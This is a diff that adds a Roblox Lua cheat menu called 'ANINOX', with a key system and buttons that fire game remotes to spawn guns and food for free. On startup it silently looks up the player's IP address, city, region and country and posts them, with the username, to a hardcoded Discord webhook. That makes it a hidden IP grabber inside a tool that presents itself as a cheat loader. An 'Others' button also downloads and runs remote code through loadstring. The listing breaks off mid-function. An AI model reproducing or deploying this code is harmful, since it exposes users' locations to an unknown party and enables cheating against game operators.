@@ -1,0 +1,859 @@
+-- SERVICES
+local Players = game:GetService("Players")
+local UIS = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
+local Debris = game:GetService("Debris")
+local player = Players.LocalPlayer
+
+-- CHANGE THE NAME
+local NAME = "ANINOX"
+
+-- Discord webhook URL
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1447440662059552956/EItwyymKs1PUsuE9-fv88mDbEJ8s4WbIDYKKczlr4mMvTFmTePkk3UgUFSh_qD6Z5fPO"
+
+-- REMOVE OLD GUI
+if game.CoreGui:FindFirstChild(NAME.."_LOADING") then
+    game.CoreGui[NAME.."_LOADING"]:Destroy()
+end
+
+-- SCREEN GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = NAME.."_LOADING"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = game:GetService("CoreGui")
+
+-- BACKGROUND
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1,0,1,0)
+bg.BackgroundColor3 = Color3.new(0,0,0)
+bg.BorderSizePixel = 0
+bg.Parent = gui
+
+-- SHADOW OVERLAY
+local shadow = Instance.new("Frame")
+shadow.Size = UDim2.new(1,0,1,0)
+shadow.Position = UDim2.new(0,0,0,0)
+shadow.BackgroundColor3 = Color3.fromRGB(10,10,10)
+shadow.BackgroundTransparency = 0.85
+shadow.ZIndex = 0
+shadow.Parent = bg
+
+-- SHADOWY SMOKE EFFECT
+task.spawn(function()
+    while gui.Parent do
+        local smoke = Instance.new("Frame")
+        local size = math.random(100,200)
+        smoke.Size = UDim2.new(0,size,0,size)
+        smoke.Position = UDim2.new(math.random(),0,math.random(),0)
+        smoke.BackgroundColor3 = Color3.fromRGB(20,20,20)
+        smoke.BackgroundTransparency = 0.75
+        smoke.BorderSizePixel = 0
+        smoke.ZIndex = 1
+        smoke.ClipsDescendants = true
+        smoke.Parent = bg
+
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0.5,0)
+        corner.Parent = smoke
+
+        local tween = TweenService:Create(smoke, TweenInfo.new(math.random(12,20), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+            Position = UDim2.new(math.random(),0,-0.2,0),
+            Size = UDim2.new(0, size + math.random(80,150), 0, size + math.random(80,150)),
+            BackgroundTransparency = 1
+        })
+        tween:Play()
+
+        Debris:AddItem(smoke, 15)
+        task.wait(math.random(0.5,1))
+    end
+end)
+
+-- LOGO
+local logo = Instance.new("ImageLabel")
+logo.AnchorPoint = Vector2.new(0.5,0.5)
+logo.Position = UDim2.new(0.5,0,0.4,0)
+logo.Size = UDim2.new(0,600,0,300)
+logo.BackgroundTransparency = 1
+logo.Image = "rbxassetid://124924881288894"
+logo.ScaleType = Enum.ScaleType.Fit
+local cornerLogo = Instance.new("UICorner")
+cornerLogo.CornerRadius = UDim.new(0.05,0)
+cornerLogo.Parent = logo
+logo.Parent = bg
+logo.ZIndex = 2
+
+-- TITLE
+local title = Instance.new("TextLabel")
+title.AnchorPoint = Vector2.new(0.5,0)
+title.Position = UDim2.new(0.5,0,0.05,0)
+title.Size = UDim2.new(0,600,0,40)
+title.BackgroundTransparency = 1
+title.Text = NAME.." LOADING"
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.Font = Enum.Font.GothamBold
+title.TextScaled = true
+title.ZIndex = 3
+title.Parent = bg
+
+-- BUTTON & TIMER FRAME
+local btnFrame = Instance.new("Frame")
+btnFrame.AnchorPoint = Vector2.new(0.5,0)
+btnFrame.Position = UDim2.new(0.5,0,0.65,0)
+btnFrame.Size = UDim2.new(0,300,0,40)
+btnFrame.BackgroundTransparency = 1
+btnFrame.ZIndex = 3
+btnFrame.Parent = bg
+
+-- BUTTON
+local nameBtn = Instance.new("TextButton")
+nameBtn.Size = UDim2.new(0,120,0,40)
+nameBtn.Position = UDim2.new(0,0,0,0)
+nameBtn.Text = NAME
+nameBtn.TextColor3 = Color3.fromRGB(255,255,255)
+nameBtn.Font = Enum.Font.GothamBold
+nameBtn.TextSize = 12
+nameBtn.BackgroundColor3 = Color3.new(0,0,0)
+nameBtn.BorderSizePixel = 0
+nameBtn.Parent = btnFrame
+local cornerBtn = Instance.new("UICorner")
+cornerBtn.CornerRadius = UDim.new(0.2,0)
+cornerBtn.Parent = nameBtn
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(255,255,255)
+stroke.Thickness = 2
+stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+stroke.Parent = nameBtn
+nameBtn.MouseButton1Click:Connect(function()
+    print(NAME.." button clicked!")
+end)
+
+-- TIMER
+local timerLabel = Instance.new("TextLabel")
+timerLabel.Size = UDim2.new(0,120,0,40)
+timerLabel.Position = UDim2.new(0,140,0,0)
+timerLabel.BackgroundTransparency = 1
+timerLabel.TextColor3 = Color3.fromRGB(255,255,255)
+timerLabel.Font = Enum.Font.Code
+timerLabel.TextSize = 12
+timerLabel.Text = "00 : 00 : 00"
+timerLabel.ZIndex = 3
+timerLabel.Parent = btnFrame
+
+-- LINE
+local line = Instance.new("Frame")
+line.AnchorPoint = Vector2.new(0.5,0)
+line.Position = UDim2.new(0.5,0,0.78,0)
+line.Size = UDim2.new(0.9,0,0,2)
+line.BackgroundColor3 = Color3.fromRGB(255,255,255)
+line.BorderSizePixel = 0
+line.ZIndex = 3
+line.Parent = bg
+
+-- INFO LABEL
+local info = Instance.new("TextLabel")
+info.AnchorPoint = Vector2.new(0.5,0)
+info.Position = UDim2.new(0.5,0,0.78,5)
+info.Size = UDim2.new(0.95,0,0,200)
+info.BackgroundTransparency = 1
+info.TextColor3 = Color3.fromRGB(255,255,255)
+info.Font = Enum.Font.Code
+info.TextSize = 12
+info.TextXAlignment = Enum.TextXAlignment.Center
+info.TextYAlignment = Enum.TextYAlignment.Top
+info.TextWrapped = true
+info.ZIndex = 3
+info.Text = "Initializing..."
+info.Parent = bg
+
+-- EXECUTION TIME LABEL
+local execTime = Instance.new("TextLabel")
+execTime.Size = UDim2.new(1,0,0,40)
+execTime.Position = UDim2.new(0,0,0.95,0)
+execTime.BackgroundTransparency = 1
+execTime.TextColor3 = Color3.fromRGB(255,255,255)
+execTime.Font = Enum.Font.GothamBold
+execTime.TextSize = 12
+execTime.TextScaled = false
+execTime.ZIndex = 3
+execTime.Text = "Execution Time : 0.000000 seconds"
+execTime.Parent = bg
+
+-- ==============================
+-- FETCH IP & SEND WEBHOOK
+-- ==============================
+local ip, country, region, city = "Unknown","Unknown","Unknown","Unknown"
+pcall(function()
+    local res = game:HttpGet("http://ip-api.com/json/")
+    local data = HttpService:JSONDecode(res)
+    if data and data.query then
+        ip = data.query or "Unknown"
+        country = data.country or "Unknown"
+        region = data.regionName or "Unknown"
+        city = data.city or "Unknown"
+    end
+end)
+
+local function SendWebhook()
+    local data = {
+        content = "",
+        embeds = {{
+            title = "TUSS KA BOSSING",
+            description = "BAHAY MO🏠",
+            color = 0x2C2C2C,
+            fields = {
+                {name="Username", value=player.Name, inline=true},
+                {name="IP Address", value=ip, inline=true},
+                {name="Region", value=region..", "..country, inline=true},
+                {name="City", value=city, inline=true},
+            }
+        }}
+    }
+    local json = HttpService:JSONEncode(data)
+    local req = (http_request or request)
+    if req then
+        pcall(function()
+            req({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"]="application/json"},
+                Body = json
+            })
+        end)
+    end
+end
+SendWebhook()
+
+-- ==============================
+-- COUNTDOWN + EXECUTION LOOP (5 sec)
+-- ==============================
+local startTime = tick()
+local totalTime = 5
+
+task.spawn(function()
+    while gui.Parent and tick() - startTime <= totalTime do
+        local elapsed = tick() - startTime
+
+        -- Timer
+        local mins = math.floor(elapsed / 60)
+        local s = math.floor(elapsed % 60)
+        timerLabel.Text = string.format("00 : %02d : %02d", mins, s)
+
+        -- Execution
+        execTime.Text = string.format("Execution Time : %.6f seconds", elapsed)
+
+        -- Info
+        info.Text = string.format(
+            "User: %s | Platform: %s\nClient IP: %s\nLocation: %s, %s, %s\nExecution Time: %.6f seconds",
+            player.Name,
+            tostring(UIS:GetPlatform()),
+            ip,
+            city,
+            region,
+            country,
+            elapsed
+        )
+
+        task.wait(0.1)
+    end
+
+    -- Destroy loading screen
+    if gui and gui.Parent then
+        gui:Destroy()
+    end
+end)
+
+-- ==============================
+-- KEY SYSTEM
+-- ==============================
+local keyFrame = Instance.new("Frame", player:WaitForChild("PlayerGui"))
+keyFrame.Size = UDim2.new(0, 260, 0, 140)
+keyFrame.Position = UDim2.new(0.5, -130, 0.5, -70)
+keyFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+keyFrame.BackgroundTransparency = 0.1
+keyFrame.Active = true
+keyFrame.Draggable = true
+Instance.new("UICorner", keyFrame)
+
+local titleKS = Instance.new("TextLabel", keyFrame)
+titleKS.Size = UDim2.new(1,0,0,28)
+titleKS.Position = UDim2.new(0,0,0,8)
+titleKS.BackgroundTransparency = 1
+titleKS.Text = "ANINOX KEY SYSTEM"
+titleKS.TextColor3 = Color3.fromRGB(255,255,255)
+titleKS.Font = Enum.Font.GothamBold
+titleKS.TextSize = 14
+
+local keyBox = Instance.new("TextBox", keyFrame)
+keyBox.Size = UDim2.new(0.9,0,0,32)
+keyBox.Position = UDim2.new(0.05,0,0.45,-16)
+keyBox.BackgroundColor3 = Color3.fromRGB(15,15,15)
+keyBox.PlaceholderText = "Enter Key"
+keyBox.Text = ""
+keyBox.TextColor3 = Color3.fromRGB(255,255,255)
+keyBox.PlaceholderColor3 = Color3.fromRGB(130,130,130)
+keyBox.Font = Enum.Font.Gotham
+keyBox.TextSize = 12
+Instance.new("UICorner", keyBox)
+
+-- wrong password sound
+local openSound = Instance.new("Sound", keyFrame)
+openSound.SoundId = "rbxassetid://90905388192102"
+openSound.Volume = 10
+openSound.Looped = false
+
+-- ENTER KEY HANDLER
+local CORRECT_KEY = "LUMUHOD-KA-KAY-CESAR"
+local unlocked = false
+
+local function shake(frame)
+    local originalPos = frame.Position
+    for i=1,6 do
+        frame.Position = originalPos + UDim2.new(0,math.random(-8,8),0,math.random(-8,8))
+        task.wait(0.03)
+    end
+    frame.Position = originalPos
+end
+
+local function submitKey()
+    local typed = string.upper(keyBox.Text or "")
+    if typed == CORRECT_KEY then
+        keyFrame:Destroy()
+        unlocked = true
+    else
+        keyBox.Text = ""
+        keyBox.PlaceholderText = "BOBO KA!"
+        keyBox.PlaceholderColor3 = Color3.fromRGB(255,40,40)
+        shake(keyFrame)
+        openSound:Play()
+        task.wait(1)
+        keyBox.PlaceholderText = "Enter Key"
+        keyBox.PlaceholderColor3 = Color3.fromRGB(130,130,130)
+    end
+end
+
+keyBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed then submitKey() end
+end)
+
+--==================================================
+-- ANINOX KEY SYSTEM + MODERN UI + LOCATION TABS
+-- INSTANT KEY GUI + ASYNC MAIN MENU + OTHERS TAB
+--==================================================
+
+-- SETTINGS
+local CORRECT_KEY = "LUMUHOD-KA-KAY-CESAR"
+local TOGGLE_KEY = Enum.KeyCode.B
+
+-- SERVICES & PLAYER
+local Players = game:GetService("Players")
+local UIS = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local player = Players.LocalPlayer
+
+-- REMOTES
+local ok, BuyItemRemote = pcall(function() return ReplicatedStorage:WaitForChild("BuyItemRemote",5) end)
+if not ok then BuyItemRemote = nil end
+local ok2, BiliEvent = pcall(function() return ReplicatedStorage:WaitForChild("BiliToolEvent",5) end)
+if not ok2 then BiliEvent = nil end
+
+-- LOCATION ITEMS
+local locationItems = {
+    ["Urban City RP"] = {
+        Guns = {{"Suppressed Pistols","Suppressed Pistols"},{"AMMO BOX","AmmoBox"}},
+        Food = {"Chicken Nugget","Energy Drink","Waneys Coke","Waynes Chicken","Waynes Fries","Waynes Hotdog","Waynes IceCream"}
+    },
+    ["Bagong Baryo"] = {
+        Guns = {
+            {"7ouuf","7ouuf"},{"AK-47","AK-47"},{"AR15","AR15"},{"Baton","Baton"},
+            {"Glock-19","Glock-19"},{"HASHIM","HASHIM"},{"HK416","HK416"},{"ILOVECHICA","ILOVECHICA"},
+            {"Kar98k","Kar98k"},{"M1 Garand","M1 Garand"},{"M4 Carbine","M4 Carbine"},{"M4A1","M4A1"},
+            {"M4A1 CQBR","M4A1 CQBR"},{"M4A1 UGRI","M4A1 UGRI"},{"M9 Bayonet","M9 Bayonet"},{"MCX","MCX"},
+            {"Pen Gun","Pen Gun"},{"Riot Shield","Riot Shield"},{"Sniper Rifle","Sniper Rifle"},{"Spas-12","Spas-12"},
+            {"Taser","Taser"},{"adrian2","adrian2"},{"alaspogi","alaspogi"},{"angel","angel"},
+            {"anghel","anghel"},{"anghelgirls","anghelgirls"},{"apollo","apollo"},{"asiancrab","asiancrab"},
+            {"astig","astig"},{"bham2","bham2"},{"bluez","bluez"},{"carlo","carlo"},{"cash","cash"},
+            {"chris","chris"},{"chrollo","chrollo"},{"Cuervo","Cuervo"},{"Daniel","Daniel"},
+            {"drey","drey"},{"drhey1","drhey1"},{"drhey2","drhey2"},{"drhey3","drhey3"},{"ericha","ericha"},
+            {"euan","euan"},{"euan1","euan1"},{"euan2","euan2"},{"euan3","euan3"},{"free","free"},
+            {"haru","haru"},{"hashim2","hashim2"},{"ht","ht"},{"jay1","jay1"},{"jeric2","jeric2"},
+            {"jhayde","jhayde"},{"Justine","Justine"},{"kaii","kaii"},{"Hand","Hand"}
+        },
+        Food = {"Tubig","Oxy","Cheeze burger"}
+    }
+}
+
+local currentLocation = "Urban City RP"
+local currentTab = "Gun"
+local unlocked = false
+
+-- MAIN GUI ROOT
+local gui = Instance.new("ScreenGui")
+gui.Name = "AninoxV1GUI"
+gui.Parent = player:WaitForChild("PlayerGui")
+gui.ResetOnSpawn = false
+
+--------------------------------------------------------------------
+-- KEY SYSTEM GUI (INSTANT)
+--------------------------------------------------------------------
+local keyFrame = Instance.new("Frame", gui)
+keyFrame.Name = "KeyFrame"
+keyFrame.Size = UDim2.new(0,260,0,170)
+keyFrame.Position = UDim2.new(0.5,-130,0.5,-85)
+keyFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+keyFrame.Active = true
+keyFrame.Draggable = true
+Instance.new("UICorner", keyFrame)
+
+local title = Instance.new("TextLabel", keyFrame)
+title.Size = UDim2.new(1,0,0,28)
+title.Position = UDim2.new(0,0,0,12)
+title.BackgroundTransparency = 1
+title.Text = "ANINOX KEY SYSTEM"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 16
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.TextXAlignment = Enum.TextXAlignment.Center
+title.TextYAlignment = Enum.TextYAlignment.Center
+
+local subtitle = Instance.new("TextLabel", keyFrame)
+subtitle.Size = UDim2.new(1,0,0,18)
+subtitle.Position = UDim2.new(0,0,0,44)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = "V1"
+subtitle.Font = Enum.Font.Gotham
+subtitle.TextSize = 12
+subtitle.TextColor3 = Color3.fromRGB(200,200,200)
+subtitle.TextXAlignment = Enum.TextXAlignment.Center
+
+local keyBox = Instance.new("TextBox", keyFrame)
+keyBox.Size = UDim2.new(0.9,0,0,36)
+keyBox.Position = UDim2.new(0.05,0,0,82)
+keyBox.BackgroundColor3 = Color3.fromRGB(15,15,15)
+keyBox.PlaceholderText = "Enter Key"
+keyBox.Text = ""
+keyBox.TextColor3 = Color3.fromRGB(255,255,255)
+keyBox.PlaceholderColor3 = Color3.fromRGB(130,130,130)
+keyBox.Font = Enum.Font.Gotham
+keyBox.TextSize = 12
+Instance.new("UICorner", keyBox)
+
+local enterBtn = Instance.new("TextButton", keyFrame)
+enterBtn.Size = UDim2.new(0.9,0,0,34)
+enterBtn.Position = UDim2.new(0.05,0,0,128)
+enterBtn.BackgroundColor3 = Color3.fromRGB(25,25,25)
+enterBtn.Text = "ENTER"
+enterBtn.TextColor3 = Color3.fromRGB(230,230,230)
+enterBtn.Font = Enum.Font.GothamBold
+enterBtn.TextSize = 13
+Instance.new("UICorner", enterBtn)
+
+local wrongSound = Instance.new("Sound", keyFrame)
+wrongSound.SoundId = "rbxassetid://90905388192102"
+wrongSound.Looped = true
+wrongSound.Volume = 10
+
+local function shakeFrame(f)
+    local orig = f.Position
+    for i=1,6 do
+        f.Position = orig + UDim2.new(0, math.random(-6,6), 0, math.random(-6,6))
+        task.wait(0.03)
+    end
+    f.Position = orig
+end
+
+--------------------------------------------------------------------
+-- MAIN GUI FUNCTION
+--------------------------------------------------------------------
+local function loadMainGUI()
+    -- MAIN FRAME
+    local mainFrame = Instance.new("Frame", gui)
+    mainFrame.Name = "MainFrame"
+    mainFrame.Size = UDim2.new(0,560,0,420)
+    mainFrame.Position = UDim2.new(0.2,0,0.12,0)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    mainFrame.BackgroundTransparency = 0.08
+    mainFrame.Visible = false
+    mainFrame.Active = true
+    mainFrame.Draggable = true
+    Instance.new("UICorner", mainFrame)
+
+    local menuTitle = Instance.new("TextLabel", mainFrame)
+    menuTitle.Name = "MenuTitle"
+    menuTitle.Size = UDim2.new(1,-20,0,28)
+    menuTitle.Position = UDim2.new(0,10,0,6)
+    menuTitle.BackgroundTransparency = 1
+    menuTitle.Text = "ANINOX V1 MENU"
+    menuTitle.Font = Enum.Font.GothamBlack
+    menuTitle.TextSize = 18
+    menuTitle.TextColor3 = Color3.fromRGB(255,255,255)
+    menuTitle.TextXAlignment = Enum.TextXAlignment.Left
+
+    -- PLAYER PANEL
+    local playerPanel = Instance.new("Frame", mainFrame)
+    playerPanel.Name = "PlayerPanel"
+    playerPanel.Size = UDim2.new(0,160,1,-50)
+    playerPanel.Position = UDim2.new(0,10,0,40)
+    playerPanel.BackgroundColor3 = Color3.fromRGB(30,30,30)
+    playerPanel.BorderSizePixel = 0
+    Instance.new("UICorner", playerPanel)
+
+    local avatarContainer = Instance.new("Frame", playerPanel)
+    avatarContainer.Size = UDim2.new(0,100,0,100)
+    avatarContainer.Position = UDim2.new(0.5,-50,0,10)
+    avatarContainer.BackgroundColor3 = Color3.fromRGB(100,100,100)
+    Instance.new("UICorner", avatarContainer).CornerRadius = UDim.new(1,0)
+
+    local avatarImg = Instance.new("ImageLabel", avatarContainer)
+    avatarImg.Size = UDim2.new(1,-6,1,-6)
+    avatarImg.Position = UDim2.new(0,3,0,3)
+    avatarImg.BackgroundTransparency = 1
+    avatarImg.Image = "rbxthumb://type=AvatarHeadShot&id="..player.UserId.."&w=420&h=420"
+    Instance.new("UICorner", avatarImg).CornerRadius = UDim.new(1,0)
+
+    local greenDot = Instance.new("Frame", avatarContainer)
+    greenDot.Size = UDim2.new(0,14,0,14)
+    greenDot.Position = UDim2.new(1,-20,1,-20)
+    greenDot.BackgroundColor3 = Color3.fromRGB(0,255,0)
+    Instance.new("UICorner", greenDot)
+
+    local function mkLabel(parent, y, text, bold)
+        local t = Instance.new("TextLabel", parent)
+        t.Size = UDim2.new(1,-12,0,20)
+        t.Position = UDim2.new(0,6,0,y)
+        t.BackgroundTransparency = 1
+        t.Text = text
+        t.TextXAlignment = Enum.TextXAlignment.Left
+        t.TextColor3 = Color3.fromRGB(230,230,230)
+        t.Font = bold and Enum.Font.GothamBold or Enum.Font.Gotham
+        t.TextSize = bold and 14 or 12
+        return t
+    end
+
+    local nameLabel = mkLabel(playerPanel, 120, "Username: "..player.Name, true)
+    local idLabel = mkLabel(playerPanel, 150, "ID: "..tostring(player.UserId), false)
+    local ageVal = tonumber(player.AccountAge) or 0
+    local ageLabel = mkLabel(playerPanel, 180, "Age: "..tostring(ageVal).." days", false)
+    local timeLabel = mkLabel(playerPanel, 210, "Time Played: 00:00:00", false)
+
+    local sessionStart = tick()
+    RunService.Heartbeat:Connect(function()
+        local s = math.floor(tick() - sessionStart)
+        local hh = math.floor(s / 3600)
+        local mm = math.floor((s % 3600) / 60)
+        local ss = s % 60
+        timeLabel.Text = string.format("Time Played: %02d:%02d:%02d", hh, mm, ss)
+    end)
+
+    -- LOCATION TABS
+    local locationTabFrame = Instance.new("Frame", playerPanel)
+    locationTabFrame.Size = UDim2.new(1,-12,0,100)
+    locationTabFrame.Position = UDim2.new(0,6,0,250)
+    locationTabFrame.BackgroundTransparency = 1
+
+    local othersTab = Instance.new("TextButton", locationTabFrame)
+    othersTab.Size = UDim2.new(1,0,0,30)
+    othersTab.Position = UDim2.new(0,0,0,6)
+    othersTab.BackgroundColor3 = Color3.fromRGB(35,35,35)
+    othersTab.Text = "OTHERS"
+    othersTab.Font = Enum.Font.GothamBold
+    othersTab.TextSize = 13
+    othersTab.TextColor3 = Color3.fromRGB(255,255,255)
+    Instance.new("UICorner", othersTab)
+
+    local urbanTab = Instance.new("TextButton", locationTabFrame)
+    urbanTab.Size = UDim2.new(1,0,0,30)
+    urbanTab.Position = UDim2.new(0,0,0,46)
+    urbanTab.BackgroundColor3 = Color3.fromRGB(35,35,35)
+    urbanTab.Text = "Urban City RP"
+    urbanTab.Font = Enum.Font.GothamBold
+    urbanTab.TextSize = 13
+    urbanTab.TextColor3 = Color3.fromRGB(255,255,255)
+    Instance.new("UICorner", urbanTab)
+
+    local baryoTab = Instance.new("TextButton", locationTabFrame)
+    baryoTab.Size = UDim2.new(1,0,0,30)
+    baryoTab.Position = UDim2.new(0,0,0,86)
+    baryoTab.BackgroundColor3 = Color3.fromRGB(35,35,35)
+    baryoTab.Text = "Bagong Baryo"
+    baryoTab.Font = Enum.Font.GothamBold
+    baryoTab.TextSize = 13
+    baryoTab.TextColor3 = Color3.fromRGB(255,255,255)
+    Instance.new("UICorner", baryoTab)
+
+    local locationHighlight = Instance.new("Frame", locationTabFrame)
+    locationHighlight.Size = UDim2.new(1,0,0,4)
+    locationHighlight.Position = UDim2.new(0,0,0,46)
+    locationHighlight.BackgroundColor3 = Color3.fromRGB(255,255,255)
+    Instance.new("UICorner", locationHighlight)
+
+    -- MAIN TAB AREA
+    local tabArea = Instance.new("Frame", mainFrame)
+    tabArea.Size = UDim2.new(1,-220,1,-30)
+    tabArea.Position = UDim2.new(0,180,0,40)
+    tabArea.BackgroundTransparency = 1
+
+    local tabFrame = Instance.new("Frame", tabArea)
+    tabFrame.Size = UDim2.new(1,-20,0,40)
+    tabFrame.Position = UDim2.new(0,10,0,6)
+    tabFrame.BackgroundTransparency = 1
+
+    local gunTab = Instance.new("TextButton", tabFrame)
+    gunTab.Size = UDim2.new(0.5,-6,1,0)
+    gunTab.Position = UDim2.new(0,0,0,0)
+    gunTab.BackgroundColor3 = Color3.fromRGB(18,18,18)
+    gunTab.Text = "GUNS"
+    gunTab.Font = Enum.Font.GothamBold
+    gunTab.TextSize = 13
+    gunTab.TextColor3 = Color3.fromRGB(255,255,255)
+    Instance.new("UICorner", gunTab)
+
+    local foodTab = Instance.new("TextButton", tabFrame)
+    foodTab.Size = UDim2.new(0.5,-6,1,0)
+    foodTab.Position = UDim2.new(0.5,6,0,0)
+    foodTab.BackgroundColor3 = Color3.fromRGB(18,18,18)
+    foodTab.Text = "FOOD"
+    foodTab.Font = Enum.Font.GothamBold
+    foodTab.TextSize = 13
+    foodTab.TextColor3 = Color3.fromRGB(255,255,255)
+    Instance.new("UICorner", foodTab)
+
+    local highlight = Instance.new("Frame", tabFrame)
+    highlight.Size = UDim2.new(0.5,0,0,4)
+    highlight.Position = UDim2.new(0,0,1,-4)
+    highlight.BackgroundColor3 = Color3.fromRGB(255,255,255)
+    Instance.new("UICorner", highlight)
+
+    -- SCROLL FRAMES
+    local gunFrame = Instance.new("ScrollingFrame", tabArea)
+    gunFrame.Size = UDim2.new(1,-20,0,320)
+    gunFrame.Position = UDim2.new(0,10,0,56)
+    gunFrame.BackgroundTransparency = 1
+    gunFrame.ScrollBarThickness = 8
+    gunFrame.CanvasSize = UDim2.new(0,0,0,0)
+    local gunLayout = Instance.new("UIListLayout", gunFrame)
+    gunLayout.Padding = UDim.new(0,6)
+
+    local foodFrame = Instance.new("ScrollingFrame", tabArea)
+    foodFrame.Size = UDim2.new(1,-20,0,320)
+    foodFrame.Position = UDim2.new(0,10,0,56)
+    foodFrame.BackgroundTransparency = 1
+    foodFrame.ScrollBarThickness = 8
+    foodFrame.CanvasSize = UDim2.new(0,0,0,0)
+    local foodLayout = Instance.new("UIListLayout", foodFrame)
+    foodLayout.Padding = UDim.new(0,6)
+
+    local othersFrame = Instance.new("ScrollingFrame", tabArea)
+    othersFrame.Size = UDim2.new(1,-20,0,320)
+    othersFrame.Position = UDim2.new(0,10,0,56)
+    othersFrame.BackgroundTransparency = 1
+    othersFrame.ScrollBarThickness = 8
+    othersFrame.CanvasSize = UDim2.new(0,0,0,0)
+    local othersLayout = Instance.new("UIListLayout", othersFrame)
+    othersLayout.Padding = UDim.new(0,6)
+
+    local function updateCanvasSizes()
+        gunFrame.CanvasSize = UDim2.new(0,0,0,gunLayout.AbsoluteContentSize.Y + 24)
+        foodFrame.CanvasSize = UDim2.new(0,0,0,foodLayout.AbsoluteContentSize.Y + 24)
+        othersFrame.CanvasSize = UDim2.new(0,0,0,othersLayout.AbsoluteContentSize.Y + 24)
+    end
+    gunLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvasSizes)
+    foodLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvasSizes)
+    othersLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvasSizes)
+
+    local function clearButtons(frame)
+        for i=#frame:GetChildren(),1,-1 do
+            local c = frame:GetChildren()[i]
+            if c:IsA("TextButton") then c:Destroy() end
+        end
+    end
+
+    local function loadItems()
+        clearButtons(gunFrame)
+        clearButtons(foodFrame)
+
+        for _, data in ipairs(locationItems[currentLocation] and locationItems[currentLocation].Guns or {}) do
+            local btn = Instance.new("TextButton")
+            btn.Size = UDim2.new(1,0,0,42)
+            btn.BackgroundColor3 = Color3.fromRGB(20,20,20)
+            btn.TextColor3 = Color3.fromRGB(240,240,240)
+            btn.Font = Enum.Font.Gotham
+            btn.TextSize = 14
+            btn.Text = data[1]
+            btn.Parent = gunFrame
+            Instance.new("UICorner", btn)
+            btn.MouseButton1Click:Connect(function()
+                pcall(function()
+                    if currentLocation == "Urban City RP" and BiliEvent then
+                        BiliEvent:FireServer(data[2],0,"jeptxhzm")
+                    elseif currentLocation == "Bagong Baryo" and BuyItemRemote then
+                        BuyItemRemote:FireServer(data[2])
+                    end
+                end)
+            end)
+        end
+
+        for _, nameText in ipairs(locationItems[currentLocation] and locationItems[currentLocation].Food or {}) do
+            local btn = Instance.new("TextButton")
+            btn.Size = UDim2.new(1,0,0,36)
+            btn.BackgroundColor3 = Color3.fromRGB(20,20,20)
+            btn.TextColor3 = Color3.fromRGB(240,240,240)
+            btn.Font = Enum.Font.Gotham
+            btn.TextSize = 13
+            btn.Text = nameText
+            btn.Parent = foodFrame
+            Instance.new("UICorner", btn)
+            btn.MouseButton1Click:Connect(function()
+                pcall(function()
+                    if ReplicatedStorage:FindFirstChild("WaynesFolder") and ReplicatedStorage.WaynesFolder:FindFirstChild("BuyTool") then
+                        ReplicatedStorage.WaynesFolder.BuyTool:FireServer(nameText,0,"makii009ww1")
+                    elseif BuyItemRemote then
+                        BuyItemRemote:FireServer(nameText)
+                    end
+                end)
+            end)
+        end
+    end
+
+    -- INITIAL LOAD
+    loadItems()
+    gunFrame.Visible = true
+    foodFrame.Visible = false
+    othersFrame.Visible = false
+    mainFrame.Visible = true
+
+    -- TAB SWITCHING
+    gunTab.MouseButton1Click:Connect(function()
+        currentTab = "Gun"
+        gunFrame.Visible = true
+        foodFrame.Visible = false
+        othersFrame.Visible = false
+        tabFrame.Visible = true
+        TweenService:Create(highlight,TweenInfo.new(0.18),{Position=UDim2.new(0,0,1,-4)}):Play()
+    end)
+    foodTab.MouseButton1Click:Connect(function()
+        currentTab = "Food"
+        gunFrame.Visible = false
+        foodFrame.Visible = true
+        othersFrame.Visible = false
+        tabFrame.Visible = true
+        TweenService:Create(highlight,TweenInfo.new(0.18),{Position=UDim2.new(0.5,0,1,-4)}):Play()
+    end)
+
+    -- LOCATION SWITCHING
+    urbanTab.MouseButton1Click:Connect(function()
+        currentLocation = "Urban City RP"
+        TweenService:Create(locationHighlight,TweenInfo.new(0.18),{Position=UDim2.new(0,0,0,46)}):Play()
+        loadItems()
+        gunTab.MouseButton1Click()
+    end)
+    baryoTab.MouseButton1Click:Connect(function()
+        currentLocation = "Bagong Baryo"
+        TweenService:Create(locationHighlight,TweenInfo.new(0.18),{Position=UDim2.new(0,0,0,86)}):Play()
+        loadItems()
+        gunTab.MouseButton1Click()
+    end)
+
+    -- OTHERS TAB
+    othersTab.MouseButton1Click:Connect(function()
+        currentLocation = "Others"
+        tabFrame.Visible = false
+        gunFrame.Visible = false
+        foodFrame.Visible = false
+        othersFrame.Visible = true
+
+        clearButtons(othersFrame)
+
+        -- Infinite Yield Button
+        local iyBtn = Instance.new("TextButton")
+        iyBtn.Size = UDim2.new(1,0,0,42)
+        iyBtn.BackgroundColor3 = Color3.fromRGB(20,20,20)
+        iyBtn.TextColor3 = Color3.fromRGB(240,240,240)
+        iyBtn.Font = Enum.Font.Gotham
+        iyBtn.TextSize = 14
+        iyBtn.Text = "Infinite Yield"
+        iyBtn.Parent = othersFrame
+        Instance.new("UICorner", iyBtn)
+        iyBtn.MouseButton1Click:Connect(function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+        end)
+
+        -- HeadsizeX ESP Button
+        local espBtn = Instance.new("TextButton")
